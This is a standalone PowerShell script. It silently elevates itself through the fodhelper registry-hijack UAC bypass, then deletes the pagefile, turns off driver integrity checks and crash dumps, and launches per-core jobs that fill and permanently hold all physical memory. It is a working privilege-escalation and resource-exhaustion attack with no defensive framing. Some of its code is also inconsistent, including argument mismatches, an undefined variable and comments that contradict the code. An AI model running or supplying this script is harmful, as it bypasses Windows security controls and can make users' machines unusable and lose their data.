# Self-elevate silently via UAC bypass
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- Pagefile Removal with Force ---
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
Import-Module ThreadJob -Force

# --- Memory Allocation Parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
$targetMem = [math]::Floor($physicalMem * 1)  # 98% of RAM
$minChunkSize = 4GB
$maxChunkSize = 15GB
$increaseChunkSize = 1GB  # Large page size
$jobs = [System.Collections.ArrayList]::new()

# --- Kernel-Level Memory Allocation Function ---
$memHogScript = {
    param(
        [int64]$minChunkSize,
        [int64]$maxChunkSize,
        [int64]$increaseChunkSize,
        [int64]$targetSize
    )

    $allocated = 0
    $memChunks = [System.Collections.Generic.List[byte[]]]::new()
    $chunkSize = $minChunkSize

    Write-Host "Starting memory hog script"
    try {
        while ($allocated -lt $targetSize) {
            Write-Host "Attempting to allocate $chunkSize bytes"
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = $chunkSize + $increaseChunkSize
                Write-Host "Increased chunk size: $chunkSize"
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
                Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
            } catch {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
                return  # Exit job if allocation fails
            }
            Start-Sleep -Milliseconds 500
        }
    } catch {
        Write-Error "An error occurred in memory hog script: $_"
    }

    # Keep $memChunks alive to prevent GC
    while ($true) { Start-Sleep -Seconds 10 }
}

function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
    $job | Add-Member -NotePropertyName Retries -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
1..([Environment]::ProcessorCount) | ForEach-Object {
    Start-StressJob -index $i
}

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# --- Monitoring with Minimal CPU Impact ---
while ($true) {
    $currentJobs = @($jobs.ToArray())
    $currentJobs | ForEach-Object {
        if ($_.State -ne 'Running') {
            Write-Host "ThreadJob is not running as expected: $($job.State)"
        }
        if ($_.Retries -lt 3 -and $_.State -ne 'Running') {
            $newJob = Start-ThreadJob -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
            $newJob | Add-Member -NotePropertyName Retries -NotePropertyValue ($_.Retries + 1)
            $jobs.Remove($_)
            $jobs.Add($newJob)
        }
    }
    Start-Sleep -Seconds 30  # Reduced monitoring frequency
}